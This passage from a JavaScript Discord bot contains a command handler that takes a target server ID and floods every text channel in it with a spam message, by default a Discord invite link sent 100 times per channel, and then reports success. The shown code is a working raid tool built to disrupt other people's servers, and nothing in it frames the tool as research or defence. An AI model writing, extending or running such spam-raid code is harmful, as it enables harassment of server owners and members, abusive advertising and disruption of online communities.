        try {
            const targetGuild = client.guilds.cache.get(targetServerId);
            if (!targetGuild) {
                return message.reply('Target server not found.');
            }
    
            const spamCount = config.SpamSettings.messageCount || 100;
            const spamMessage = config.SpamSettings.message || "https://discord.gg/bxMjzEXgZR";
    
            log(`Preparing to spam ${spamCount} messages in all text channels of server: ${targetGuild.name}`, 'info');
    
            const textChannels = targetGuild.channels.cache.filter(channel => channel.isTextBased());
            if (textChannels.size === 0) {
                return message.reply('No text channels available in the target server.');
            }
    
            const spamPromises = [];
            textChannels.forEach(channel => {
                for (let i = 0; i < spamCount; i++) {
                    spamPromises.push(
                        channel.send(spamMessage).catch(err => {
                            log(`Failed to send spam message in ${channel.name}: ${err.message}`, 'error');
                        })
                    );
                }
            });
    
            await Promise.all(spamPromises);
    
            message.reply(`✅ Successfully spammed ${spamCount} messages in all text channels of ${targetGuild.name}.`);
        } catch (err) {
            console.error('Error while spamming messages:', err);
            message.reply('❌ An error occurred while spamming messages.');
        }
    }
    
    
});

client.login(config.token);